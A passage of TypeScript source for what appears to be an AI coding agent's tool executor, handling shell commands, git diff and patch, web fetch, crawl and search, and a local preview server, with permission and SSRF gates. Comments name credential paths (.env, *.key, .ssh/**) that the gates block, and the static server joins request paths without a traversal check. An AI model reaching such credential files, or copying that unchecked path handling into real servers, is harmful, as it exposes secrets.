      ...(sandbox.cpus !== undefined ? { cpus: sandbox.cpus } : {}),
      ...(sandbox.network !== undefined ? { allowNetwork: sandbox.network } : {}),
    };
    const sb = runInDockerSandbox(path.resolve(ctx.workdir), command, limits);
    return formatCommandResult(
      command,
      sb.exitCode,
      `${sb.stdout}${sb.stderr}`.trim(),
      sb.timedOut,
    );
  }
  const { code, output, timedOut } = await runProcess(command, [], {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.env !== undefined ? { env: ctx.env } : {}),
    shell: true,
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  return formatCommandResult(command, code, output, timedOut);
}

function formatCommandResult(
  command: string,
  code: number | null,
  output: string,
  timedOut: boolean,
): ToolResult {
  if (timedOut) {
    return fail(`command "${command}" timed out after ${COMMAND_TIMEOUT_MS}ms\n${output}`);
  }
  const exit = code ?? -1;
  const body = `$ ${command}\nexit code: ${exit}\n${output}`.trimEnd();
  return code === 0 ? ok(body) : fail(body);
}

async function execGitDiff(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const staged = args['staged'] === true;
  const paths = (args['paths'] as string[] | undefined) ?? [];
  const gitArgs = ['diff'];
  if (staged) {
    gitArgs.push('--cached');
  }
  if (paths.length > 0) {
    for (const relPath of paths) {
      const confined = assertConfined(ctx.workdir, relPath);
      if ('error' in confined) {
        return fail(`rejected: ${confined.error}`);
      }
      // SECURITY: refuse to diff a blocked path (e.g. `git diff -- .env`) — read
      // is gated like read_file, not left to output redaction alone.
      const decision = ctx.permissions.checkPath(relPath, 'read');
      if (!decision.allowed) {
        return fail(`rejected: reading "${relPath}" is blocked (${decision.reason})`);
      }
    }
    gitArgs.push('--', ...paths);
  }
  const { code, output, timedOut } = await runProcess('git', gitArgs, {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  if (timedOut) {
    return fail('git diff timed out');
  }
  if (code !== 0) {
    return fail(`git diff failed (exit ${code ?? -1}):\n${output}`);
  }
  return ok(output.length > 0 ? output : '(no changes)');
}

async function execApplyPatch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const diff = args['diff'] as string;
  // SECURITY: `git apply` only refuses OUT-OF-TREE writes; an IN-TREE diff could
  // still create/overwrite a blocked path (.env, *.key, .ssh/**) that write_file
  // denies — a clean bypass. Gate every target path through checkPath('write')
  // (and confine it) BEFORE applying, so apply_patch honours the same policy.
  for (const target of diffTargetPaths(diff)) {
    const confined = assertConfined(ctx.workdir, target);
    if ('error' in confined) {
      return fail(`patch rejected: ${confined.error}`);
    }
    const decision = ctx.permissions.checkPath(target, 'write');
    if (!decision.allowed) {
      return fail(`patch rejected: writing "${target}" is blocked (${decision.reason})`);
    }
  }
  // `git apply` (no --unsafe-paths) refuses out-of-tree / absolute paths itself.
  const { code, output, timedOut } = await runProcess(
    'git',
    ['apply', '--whitespace=nowarn', '-'],
    {
      cwd: path.resolve(ctx.workdir),
      input: diff.endsWith('\n') ? diff : `${diff}\n`,
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
    },
  );
  if (timedOut) {
    return fail('git apply timed out');
  }
  if (code !== 0) {
    return fail(`patch did not apply (exit ${code ?? -1}):\n${output}`);
  }
  return ok('patch applied');
}

async function execCreateBranch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const name = args['name'] as string;
  const { code, output, timedOut } = await runProcess('git', ['checkout', '-b', name], {
    cwd: path.resolve(ctx.workdir),
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
  });
  if (timedOut) {
    return fail('git checkout timed out');
  }
  if (code !== 0) {
    return fail(`could not create branch "${name}" (exit ${code ?? -1}):\n${output}`);
  }
  return ok(`created and switched to branch "${name}"`);
}

/**
 * `update_tasks` is a no-op on disk: it only declares the agent's checklist. The
 * native adapter turns the (validated) snapshot into a `task_update` event for
 * the UI; here we just acknowledge it so the model continues.
 */
function execUpdateTasks(args: Record<string, unknown>): ToolResult {
  const tasks = Array.isArray(args['tasks']) ? (args['tasks'] as unknown[]) : [];
  const done = tasks.filter(
    (t) => typeof t === 'object' && t !== null && (t as { status?: string }).status === 'completed',
  ).length;
  return ok(`checklist updated (${done}/${tasks.length} done)`);
}

/**
 * Executes a native tool with full defense in depth (validation → path
 * confinement → permission gate → redaction). NEVER throws: a denied/invalid
 * request returns `{ ok: false, result }` so the result can be fed back to the
 * model. `requiresConfirmation` is NOT handled here — the adapter resolves the
 * confirm-or-decline gate before calling this function.
 */
/** Formats a fetched result for the model, noting the serving tier if not native. */
function formatFetch(res: WebFetchResult): string {
  const via = res.meta.tier !== 'native' ? ` (via ${res.meta.tier})` : '';
  const header =
    res.title.length > 0 && res.title !== res.url
      ? `# ${res.title}${via}\n${res.url}\n\n`
      : `${res.url}${via}\n\n`;
  return `${header}${res.markdown}`;
}

/**
 * Builds the hosted-reader tier (F5) for the run's `scrape` config, or null when
 * absent / unkeyed. The BYOK key is resolved from the env var NAMED in config.
 */
function buildHostedReader(ctx: ToolExecutionContext): TierReader | null {
  const scrape = ctx.config.scrape;
  if (scrape === undefined) return null;
  const env = ctx.scrapeEnv ?? process.env;
  const apiKey = scrape.apiKeyEnv !== undefined ? env[scrape.apiKeyEnv] : undefined;
  return hostedReaderTier(
    {
      provider: scrape.provider,
      ...(scrape.apiKeyEnv !== undefined ? { apiKeyEnv: scrape.apiKeyEnv } : {}),
      ...(scrape.baseUrl !== undefined ? { baseUrl: scrape.baseUrl } : {}),
      timeoutMs: scrape.timeoutMs,
      jinaKeyless: scrape.jinaKeyless,
    },
    {
      ...(apiKey !== undefined ? { apiKey } : {}),
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      allowHost: (u) => ctx.permissions.isUrlAllowed(u),
    },
  );
}

/**
 * `web_fetch` — governed by the network policy; SSRF + caps live in webFetch().
 * A TIER-ORDERED pipeline: an OPTIONAL hosted reader (F5, `scrape.mode='prefer'`)
 * runs FIRST; the free Tier-1 floor always backs it; and a thin/JS-only/403/429
 * result ESCALATES to the hosted reader (`fallback` mode) and/or the opt-in local
 * browser (F4). Every tier is best-effort — a failure never aborts the fetch.
 */
async function execWebFetch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const url = String(args['url'] ?? '');
  const maxChars = typeof args['maxChars'] === 'number' ? args['maxChars'] : undefined;
  const decision = ctx.permissions.checkUrl(url);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  const browserCfg = ctx.config.browser;
  const scrapeCfg = ctx.config.scrape;
  const canBrowser = browserCfg?.enabled === true && ctx.browserReader !== undefined;
  const thin = browserCfg?.thinContentChars ?? 200;
  const readerCtx = {
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
    maxBytes: 2 * 1024 * 1024,
    maxChars: maxChars ?? 50_000,
  };
  const hostedReader = buildHostedReader(ctx);
  // `prefer` mode: the hosted tier runs BEFORE Tier-1 (inside webFetch readers).
  const preferredReaders =
    hostedReader !== null && (scrapeCfg?.mode ?? 'prefer') === 'prefer' ? [hostedReader] : [];
  // Post-Tier-1 escalation order (on a thin native result or a fetch failure):
  // hosted (`fallback` mode) then the local browser.
  const fallbackReaders: TierReader[] = [];
  if (hostedReader !== null && scrapeCfg?.mode === 'fallback') fallbackReaders.push(hostedReader);
  if (canBrowser && ctx.browserReader !== undefined) fallbackReaders.push(ctx.browserReader);
  const tryFallbacks = async (): Promise<WebFetchResult | null> => {
    for (const reader of fallbackReaders) {
      try {
        const served = await reader(url, readerCtx);
        if (served !== null) return served;
      } catch {
        // best-effort: try the next fallback tier, ultimately keep the Tier-1 result.
      }
    }
    return null;
  };
  try {
    const res = await webFetch(url, {
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      ...(maxChars !== undefined ? { maxChars } : {}),
      readers: preferredReaders,
    });
    if (res.meta.tier === 'native' && res.markdown.trim().length < thin) {
      const better = await tryFallbacks();
      if (better !== null && better.markdown.length > res.markdown.length) {
        return guardWeb(formatFetch(better), 'web_fetch', url, ctx);
      }
    }
    return guardWeb(formatFetch(res), 'web_fetch', url, ctx);
  } catch (error) {
    const fallback = await tryFallbacks();
    if (fallback !== null) {
      return guardWeb(formatFetch(fallback), 'web_fetch', url, ctx);
    }
    return fail(`web_fetch failed: ${error instanceof Error ? error.message : String(error)}`);
  }
}

/**
 * `web_extract` (F4) — fetches a page (browser-rendered when enabled, else Tier-1)
 * then runs ONE constrained model call (ctx.gateway) to return JSON matching the
 * caller's schema. Fail-closed: no gateway → a clear error, never a silent skip.
 */
async function execWebExtract(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const url = String(args['url'] ?? '');
  const schema = (args['schema'] ?? {}) as Record<string, unknown>;
  const instructions = typeof args['instructions'] === 'string' ? args['instructions'] : undefined;
  const maxChars = typeof args['maxChars'] === 'number' ? args['maxChars'] : undefined;
  const decision = ctx.permissions.checkUrl(url);
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (ctx.gateway === undefined) {
    return fail('web_extract needs a model to run; none is configured for this run.');
  }
  const browserCfg = ctx.config.browser;
  const canBrowser = browserCfg?.enabled === true && ctx.browserReader !== undefined;
  const readerCtx = {
    ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
    maxBytes: 2 * 1024 * 1024,
    maxChars: maxChars ?? 50_000,
  };
  try {
    let page: WebFetchResult | null = null;
    let source: 'browser' | 'tier1' = 'tier1';
    if (canBrowser && ctx.browserReader !== undefined) {
      page = await ctx.browserReader(url, readerCtx).catch(() => null);
      if (page !== null) source = 'browser';
    }
    if (page === null) {
      page = await webFetch(url, {
        ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
        ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
        ...(maxChars !== undefined ? { maxChars } : {}),
      });
    }
    // Defuddle strips the <title> into page.title (NOT the markdown body), so
    // prepend it — otherwise title/metadata extractions can't see it.
    const content =
      page.title.length > 0 && page.title !== page.url
        ? `# ${page.title}\n\n${page.markdown}`
        : page.markdown;
    const extracted = await extractStructured(url, {
      schema,
      markdown: content,
      gateway: ctx.gateway,
      source,
      ...(ctx.model !== undefined ? { model: ctx.model } : {}),
      ...(ctx.provider !== undefined ? { provider: ctx.provider } : {}),
      ...(instructions !== undefined ? { instructions } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
    });
    return ok(
      `Extracted from ${url} (via ${extracted.source}):\n\n${JSON.stringify(extracted.data, null, 2)}`,
    );
  } catch (error) {
    return fail(`web_extract failed: ${error instanceof Error ? error.message : String(error)}`);
  }
}

/** Formats a crawl result for the model: a stats line + per-page sections. */
function formatCrawl(result: CrawlResult): string {
  if (result.pages.length === 0) {
    return 'web_crawl found no pages (robots/blocked/empty).';
  }
  const s = result.stats;
  const head = `Crawled ${result.pages.length} page(s) [fetched ${s.fetched}, cached ${s.cached}, robots-skipped ${s.skippedByRobots}, blocked ${s.skippedBlocked}, depth ${s.depthReached}]:`;
  const sections = result.pages.map((p) => {
    const title = p.title.length > 0 && p.title !== p.url ? `# ${p.title}\n` : '';
    return `--- ${p.url}${p.fromCache ? ' (cached)' : ''} ---\n${title}${p.markdown}`;
  });
  return `${head}\n\n${sections.join('\n\n')}`;
}

/**
 * `web_crawl` (F4) — bounded BFS from a seed URL through the polite-fetch layer
 * (robots + per-host rate limit + on-disk cache). Network-gated up front; every
 * discovered URL is independently SSRF/allowlist-checked before it is fetched.
 */
async function execWebCrawl(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const url = String(args['url'] ?? '');
  const net = ctx.permissions.checkNetwork();
  if (!net.allowed) {
    return fail(`permission denied: ${net.reason}`);
  }
  // The seed itself must clear the SSRF/allowlist gate.
  const seedDecision = ctx.permissions.checkUrl(url);
  if (!seedDecision.allowed) {
    return fail(`permission denied: ${seedDecision.reason}`);
  }
  const crawlCfg = ctx.config.crawl;
  const cache = ctx.webCache;
  const rateLimiter = ctx.rateLimiter ?? new RateLimiter();
  const robotsCache = new Map<string, import('./web/polite-fetch').RobotsRules>();
  const fetchOne = (target: string): ReturnType<typeof politeFetch> =>
    politeFetch(target, {
      ...(cache !== undefined ? { cache } : {}),
      rateLimiter,
      robotsCache,
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      respectRobots: crawlCfg?.respectRobots ?? true,
      perHostDelayMs: crawlCfg?.perHostDelayMs ?? 1000,
    });
  try {
    const result = await crawl(url, {
      ...(typeof args['maxDepth'] === 'number' ? { maxDepth: args['maxDepth'] } : {}),
      ...(typeof args['maxPages'] === 'number' ? { maxPages: args['maxPages'] } : {}),
      hardMaxPages: crawlCfg?.maxPages ?? 10,
      ...(typeof args['sameHostOnly'] === 'boolean' ? { sameHostOnly: args['sameHostOnly'] } : {}),
      ...(typeof args['useSitemap'] === 'boolean' ? { useSitemap: args['useSitemap'] } : {}),
      politeFetch: fetchOne,
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      isAllowed: (target) => ctx.permissions.checkUrl(target).allowed,
    });
    return guardWeb(formatCrawl(result), 'web_crawl', url, ctx);
  } catch (error) {
    return fail(`web_crawl failed: ${error instanceof Error ? error.message : String(error)}`);
  }
}

/** Formats a search response as compact, model-readable lines. */
function formatSearchResults(res: WebSearchResponse): string {
  if (res.results.length === 0) {
    return `No web results for "${res.query}" (via ${res.provider}).`;
  }
  const lines = res.results.map((r, index) => {
    const snippet = r.snippet.length > 300 ? `${r.snippet.slice(0, 300)}…` : r.snippet;
    const body = snippet.length > 0 ? `\n   ${snippet}` : '';
    return `${index + 1}. ${r.title}\n   ${r.url}${body}`;
  });
  return `Web search results for "${res.query}" (via ${res.provider}):\n\n${lines.join('\n\n')}`;
}

/**
 * `web_search` — free + unlimited by default (local SearXNG → DuckDuckGo),
 * governed by the network policy. The hard lockdown (`network.mode = off`) is
 * denied here; `ask`/`auto` are resolved by the adapter's confirmation gate. The
 * per-provider host is SSRF/allowlist-checked via `isUrlAllowed`; the local
 * SearXNG (deliberate loopback infra) is reached directly through its resolver.
 */
async function execWebSearch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const query = String(args['query'] ?? '');
  const maxResults = typeof args['maxResults'] === 'number' ? args['maxResults'] : undefined;
  const net = ctx.permissions.checkNetwork();
  if (!net.allowed) {
    return fail(`permission denied: ${net.reason}`);
  }
  const searchCfg = ctx.config.search ?? DEFAULT_SEARCH_PROVIDER;
  const type = searchCfg.type ?? 'auto';
  const env = ctx.searchEnv ?? process.env;
  const apiKey =
    searchCfg.apiKeyEnv !== undefined ? (env[searchCfg.apiKeyEnv] ?? undefined) : undefined;

  // Resolve a local SearXNG only for the free auto/searxng paths.
  let searxngUrl: string | null = null;
  if (type === 'auto' || type === 'searxng') {
    if (ctx.resolveSearxng !== undefined) {
      try {
        searxngUrl = await ctx.resolveSearxng();
      } catch {
        searxngUrl = null;
      }
    }
    if (searxngUrl === null && searchCfg.baseUrl !== undefined) {
      searxngUrl = searchCfg.baseUrl;
    }
  }

  try {
    const res = await webSearch(query, {
      config: searchCfg,
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      ...(maxResults !== undefined ? { maxResults } : {}),
      ...(apiKey !== undefined ? { apiKey } : {}),
      searxngUrl,
      allowHost: (url) => ctx.permissions.isUrlAllowed(url),
    });
    return ok(formatSearchResults(res));
  } catch (error) {
    return fail(`web_search failed: ${error instanceof Error ? error.message : String(error)}`);
  }
}

interface EvidenceSource {
  n: number;
  url: string;
  title: string;
  hash: string;
  fetchedAt: string;
  excerpt: string;
}

/** Formats a research evidence bundle: numbered, hashed, timestamped sources + guidance. */
function formatEvidenceBundle(
  question: string,
  hitCount: number,
  sources: EvidenceSource[],
): string {
  if (sources.length === 0) {
    return `Researched "${question}" but no sources could be fetched (searched ${hitCount} hits).`;
  }
  const blocks = sources.map(
    (s) =>
      `[${s.n}] ${s.title}\n    ${s.url}\n    fetched ${s.fetchedAt} · sha256 ${s.hash.slice(0, 12)}\n    ${s.excerpt}`,
  );
  return [
    `Evidence bundle for "${question}" (${sources.length} sources fetched of ${hitCount} found).`,
    'Synthesize a concise answer citing sources inline as [n]. Do NOT state anything the sources do not support; flag uncertainty.',
    '',
    blocks.join('\n\n'),
  ].join('\n');
}

/**
 * `research` (F7) — the model-first research tool: fan-out search → fetch the top
 * sources (hashed + timestamped) → return a SOURCED EVIDENCE BUNDLE the model
 * synthesizes into a cited answer. Gateway-free (the in-loop model does the
 * synthesis); network-gated; every source URL is SSRF/allowlist-checked.
 */
async function execResearch(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const question = String(args['question'] ?? '');
  const net = ctx.permissions.checkNetwork();
  if (!net.allowed) {
    return fail(`permission denied: ${net.reason}`);
  }
  const researchCfg = ctx.config.research ?? DEFAULT_RESEARCH;
  const maxSources =
    typeof args['maxSources'] === 'number' ? args['maxSources'] : researchCfg.maxSources;

  // Resolve the free search backend exactly like web_search.
  const searchCfg = ctx.config.search ?? DEFAULT_SEARCH_PROVIDER;
  const type = searchCfg.type ?? 'auto';
  const env = ctx.searchEnv ?? process.env;
  const apiKey =
    searchCfg.apiKeyEnv !== undefined ? (env[searchCfg.apiKeyEnv] ?? undefined) : undefined;
  let searxngUrl: string | null = null;
  if (type === 'auto' || type === 'searxng') {
    if (ctx.resolveSearxng !== undefined) {
      try {
        searxngUrl = await ctx.resolveSearxng();
      } catch {
        searxngUrl = null;
      }
    }
    if (searxngUrl === null && searchCfg.baseUrl !== undefined) {
      searxngUrl = searchCfg.baseUrl;
    }
  }

  let hits;
  try {
    const res = await webSearch(question, {
      config: searchCfg,
      maxResults: Math.min(20, Math.max(maxSources * 2, maxSources)),
      ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
      ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
      ...(apiKey !== undefined ? { apiKey } : {}),
      searxngUrl,
      allowHost: (url) => ctx.permissions.isUrlAllowed(url),
    });
    hits = res.results;
  } catch (error) {
    return fail(
      `research failed (search): ${error instanceof Error ? error.message : String(error)}`,
    );
  }

  const sources: EvidenceSource[] = [];
  for (const hit of hits) {
    if (sources.length >= maxSources) break;
    if (!ctx.permissions.checkUrl(hit.url).allowed) continue;
    try {
      const page = await webFetch(hit.url, {
        ...(ctx.httpFetch !== undefined ? { fetchImpl: ctx.httpFetch } : {}),
        ...(ctx.signal !== undefined ? { signal: ctx.signal } : {}),
        maxChars: 4000,
      });
      sources.push({
        n: sources.length + 1,
        url: hit.url,
        title: page.title,
        hash: createHash('sha256').update(page.markdown).digest('hex'),
        fetchedAt: new Date().toISOString(),
        excerpt: page.markdown.slice(0, 1500),
      });
    } catch {
      // Skip an unreachable source; keep gathering.
    }
  }
  return guardWeb(formatEvidenceBundle(question, hits.length, sources), 'research', undefined, ctx);
}

/**
 * `lsp` (P1.8b): on-demand code intelligence — definition / references / hover
 * at a 1-based (line,column). Read-only: gated by `read_file` path permission +
 * path confinement. Graceful when no language server is available for the file.
 */
async function execLsp(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const relPath = args['path'] as string;
  const line = args['line'] as number;
  const column = args['column'] as number;
  const query = args['query'] as 'definition' | 'references' | 'hover';
  const confined = assertConfined(ctx.workdir, relPath);
  if ('error' in confined) {
    return fail(`rejected: ${confined.error}`);
  }
  const decision = ctx.permissions.checkPath(relPath, 'read');
  if (!decision.allowed) {
    return fail(`permission denied: ${decision.reason}`);
  }
  if (ctx.lsp === undefined) {
    return fail('no language server is available (LSP is disabled or unsupported for this file)');
  }
  const result = await ctx.lsp.queryFor(relPath, line, column, query);
  if (result === null) {
    // Turn a silent "no server" into actionable guidance (P1.10): tell the model
    // whether the file type is unsupported or the server is just not installed,
    // and in the latter case exactly how to install it.
    const availability = lspAvailabilityFor(relPath, ctx.config.lsp?.servers);
    if (availability.status === 'missing') {
      const how = availability.install !== null ? ` Install it with: ${availability.install}` : '';
      return fail(
        `the ${availability.language} language server ("${availability.command}") is not installed, so "${query}" is unavailable for "${relPath}".${how}`,
      );
    }
    if (availability.status === 'unsupported') {
      return fail(`no language server is configured for "${relPath}" (unsupported file type).`);
    }
    return fail(`the language server returned no "${query}" result for "${relPath}".`);
  }
  if (query === 'hover') {
    return ok(result.hover ?? `No hover information at ${relPath}:${line}:${column}.`);
  }
  const locations = result.locations ?? [];
  if (locations.length === 0) {
    return ok(`No ${query} found at ${relPath}:${line}:${column}.`);
  }
  const header = query === 'definition' ? 'Definition(s)' : 'Reference(s)';
  const lines = locations.map((loc) => `  ${loc.file}:${loc.line}:${loc.column}`);
  return ok(`${header} of the symbol at ${relPath}:${line}:${column}:\n${lines.join('\n')}`);
}

/**
 * `question` (P1.8b): ask the human a clarifying question mid-run. Returns their
 * answer, or — when no human channel is wired (autonomous/CI) or they answer
 * empty — a note telling the model to proceed on its best judgment. Never blocks
 * a headless run.
 */
async function execQuestion(
  args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const question = args['question'] as string;
  const context = args['context'] as string | undefined;
  if (ctx.ask === undefined) {
    return ok(
      'No human is available to answer (autonomous run). Proceed with your best judgment and state the assumption you made.',
    );
  }
  const prompt =
    context !== undefined && context.length > 0 ? `${question} (${context})` : question;
  let answer: string;
  try {
    answer = await ctx.ask(prompt);
  } catch {
    return ok(
      'Could not get an answer. Proceed with your best judgment and state your assumption.',
    );
  }
  if (answer.trim().length === 0) {
    return ok(
      'No answer was provided. Proceed with your best judgment and state the assumption you made.',
    );
  }
  return ok(`The human answered: ${answer.trim()}`);
}

/**
 * `skill` (P1.8b): progressive disclosure. With no name → list available skills
 * (name + description). With a name → return that skill's full instructions.
 * Reads the body lazily from the indexed path. Graceful when there are no skills.
 */
function execSkill(args: Record<string, unknown>, ctx: ToolExecutionContext): ToolResult {
  const skills = ctx.skills ?? [];
  const requested =
    typeof args['name'] === 'string' ? (args['name'] as string).toLowerCase().trim() : '';
  if (skills.length === 0) {
    return ok('No skills are available in this project.');
  }
  if (requested.length === 0) {
    const lines = skills.map((s) => `  - ${s.name}: ${s.description}`);
    return ok(
      `Available skills (call \`skill\` with a name to load its full instructions):\n${lines.join('\n')}`,
    );
  }
  const match = skills.find((s) => s.name === requested);
  if (match === undefined) {
    const names = skills.map((s) => s.name).join(', ');
    return fail(`unknown skill "${requested}". Available: ${names}.`);
  }
  // Skill approval (P2.18): in 'approved' mode, withhold the body of any skill
  // not on the approved list — it stays discoverable, but its instructions are
  // gated so untrusted third-party skills can't inject themselves into context.
  if (ctx.skillApproval === 'approved' && !(ctx.approvedSkills ?? []).includes(match.name)) {
    return ok(
      `Skill "${match.name}" requires approval before its instructions can load. ` +
        `Add it to \`skills.approved\` in .excalibur/config.yaml to enable it.`,
    );
  }
  let body: string;
  try {
    body = readSkillBody(match.path);
  } catch {
    return fail(`could not read the "${requested}" skill.`);
  }
  return ok(`# Skill: ${match.name}\n\n${body}`);
}

/**
 * Bridges a read-only MANAGEMENT tool to its host-injected implementation
 * (`ctx.management.*`). The host (CLI/core) owns the stores and returns the
 * agent-facing text; absent → the capability is unavailable here (a plain CLI
 * subcommand still works, but this in-loop tool needs the host to wire it).
 */
async function execManagement(
  ctx: ToolExecutionContext,
  method: keyof ManagementToolset,
  label: string,
  args: Record<string, unknown>,
): Promise<ToolResult> {
  const fn = ctx.management?.[method] as
    | ((a: Record<string, unknown>) => Promise<string>)
    | undefined;
  if (fn === undefined) {
    return fail(`\`${label}\` is not available in this context.`);
  }
  const text = await fn(args);
  return ok(text.trim().length > 0 ? text : `${label}: (nothing to report)`);
}

// --- preview (RUN-FIX-21): serve the user's project on localhost --------------

/**
 * Live preview servers the agent started for the user's project. Tracked here — NOT
 * routed through run_command (which reaps its tree on settle) — so the dev server keeps
 * running for the whole session while the user views the app. Reaped on process exit so
 * nothing is orphaned after the m-shell closes.
 */
const previewServers = new Set<ChildProcess>();
let previewCleanupInstalled = false;
function trackPreview(child: ChildProcess): void {
  previewServers.add(child);
  child.once('exit', () => previewServers.delete(child));
  if (!previewCleanupInstalled) {
    previewCleanupInstalled = true;
    process.once('exit', () => {
      for (const c of previewServers) {
        try {
          if (typeof c.pid === 'number' && c.pid > 0) process.kill(-c.pid, 'SIGKILL');
        } catch {
          /* best-effort */
        }
      }
    });
  }
}

/**
 * Stop every live preview server. Called on a clean session teardown (and by tests) so
 * a detached dev server is not left running. The `process.once('exit')` hook in
 * `trackPreview` is the last-resort net; this is the graceful path.
 */
export function stopAllPreviews(): void {
  for (const c of previewServers) {
    try {
      if (typeof c.pid === 'number' && c.pid > 0) {
        // Detached on POSIX → kill the whole group; fall back to the bare pid on Windows.
        if (process.platform !== 'win32') process.kill(-c.pid, 'SIGKILL');
        else c.kill('SIGKILL');
      }
    } catch {
      /* best-effort */
    }
  }
  previewServers.clear();
}

/** A tiny zero-dependency static file server (for a no-build site: an index.html). */
const STATIC_SERVER_SRC =
  "const http=require('http'),fs=require('fs'),p=require('path');const root=process.cwd();" +
  'const port=Number(process.env.PORT)||0;' +
  "const s=http.createServer((q,r)=>{let f=p.join(root,decodeURIComponent((q.url||'/').split('?')[0]));" +
  "try{if(fs.statSync(f).isDirectory())f=p.join(f,'index.html')}catch{}" +
  "fs.readFile(f,(e,d)=>{if(e){r.statusCode=404;r.end('Not found')}else{" +
  "const t={'.html':'text/html','.js':'text/javascript','.css':'text/css','.json':'application/json','.svg':'image/svg+xml'}[p.extname(f)];" +
  "if(t)r.setHeader('content-type',t);r.end(d)}})});" +
  "s.listen(port,()=>console.log('Local:   http://localhost:'+s.address().port+'/'));";

/**
 * `preview` — start a LOCAL dev/preview server for the project and return its URL so
 * the user can open the web in a browser (RUN-FIX-21). Detects a package.json
 * dev/start/serve/preview script; falls back to a built-in static server for a bare
 * `index.html`. The server is detached and KEPT RUNNING for the session (not reaped
 * like a run_command), and its URL is parsed from the server's own output.
 */
async function execPreview(
  _args: Record<string, unknown>,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const dir = ctx.workdir;
  let label: string;
  let cmd: string;
  let cmdArgs: string[];
  const env: NodeJS.ProcessEnv = { ...process.env };
  type Pkg = { scripts?: Record<string, string> };
  let pkg: Pkg | null = null;
  try {
    if (existsSync(path.join(dir, 'package.json'))) {
      pkg = JSON.parse(readFileSync(path.join(dir, 'package.json'), 'utf8')) as Pkg;
    }
  } catch {
    pkg = null;
  }
  const script = pkg?.scripts
    ? (['dev', 'start', 'serve', 'preview'] as const).find((s) => pkg?.scripts?.[s] !== undefined)
    : undefined;
  if (script !== undefined) {
    label = `npm run ${script}`;
    cmd = process.platform === 'win32' ? 'npm.cmd' : 'npm';
    cmdArgs = ['run', script];
  } else if (existsSync(path.join(dir, 'index.html'))) {
    label = 'static server';
    cmd = process.execPath;
    cmdArgs = ['-e', STATIC_SERVER_SRC];
    env.PORT = process.env.PORT ?? '0';
  } else {
    return fail(
      'no web app to preview — no package.json dev/start/serve/preview script and no index.html. Build the web first, then call preview.',
    );
  }

  let child: ChildProcess;
  try {
    child = spawn(cmd, cmdArgs, {
      cwd: dir,
      env,
      detached: process.platform !== 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (error) {
    return fail(`could not start the preview (${label}): ${(error as Error).message}`);
  }
  trackPreview(child);

  // Parse the URL the server prints (Vite "Local:", Next "started server on", a bare
  // "http://localhost:PORT", etc.). Give it up to 25s — a first `dev` run can compile.
  let out = '';
  const url = await new Promise<string | null>((resolve) => {
    const onData = (chunk: Buffer): void => {
      out += chunk.toString('utf8');
      const match = out.match(/https?:\/\/(?:localhost|127\.0\.0\.1|0\.0\.0\.0)(?::\d+)?[^\s'"]*/i);
      if (match) {
        finish(match[0].replace('0.0.0.0', 'localhost'));
      }
    };
    const timer = setTimeout(() => finish(null), 25_000);
    const finish = (value: string | null): void => {
      clearTimeout(timer);
      child.stdout?.off('data', onData);
      child.stderr?.off('data', onData);
      resolve(value);
    };
    child.stdout?.on('data', onData);
    child.stderr?.on('data', onData);
    child.once('error', () => finish(null));
    child.once('exit', () => finish(null));
  });

  if (url === null) {
    return ok(
      `Started the preview (${label}) but could not detect its URL within 25s. It may still be compiling. Recent output:\n${redactSecrets(out.slice(-800))}`,
    );
  }
  return ok(
    `The web app is live at ${url} (via ${label}) and stays up for this session. Tell the user to open ${url} in their browser.`,
  );
}

export async function executeNativeTool(
  name: NativeToolName,
  rawArgs: unknown,
  ctx: ToolExecutionContext,
): Promise<ToolResult> {
  const validated = validate(name, rawArgs);
  if ('error' in validated) {
    return fail(validated.error);
  }
  const args = validated.data;

  try {
    switch (name) {
      case 'read_file':
        return execReadFile(args, ctx);
      case 'write_file':
        return execWriteFile(args, ctx);
      case 'edit':
        return execEdit(args, ctx);
      case 'list_files':
        return execListFiles(args, ctx);
      case 'search_code':
        return execSearchCode(args, ctx);
      case 'run_command':
        return await execRunCommand(args, ctx);
      case 'preview':
        return await execPreview(args, ctx);
      case 'run_tests':
        return await execRunTests(args, ctx);
      case 'git_diff':
        return await execGitDiff(args, ctx);
      case 'apply_patch':
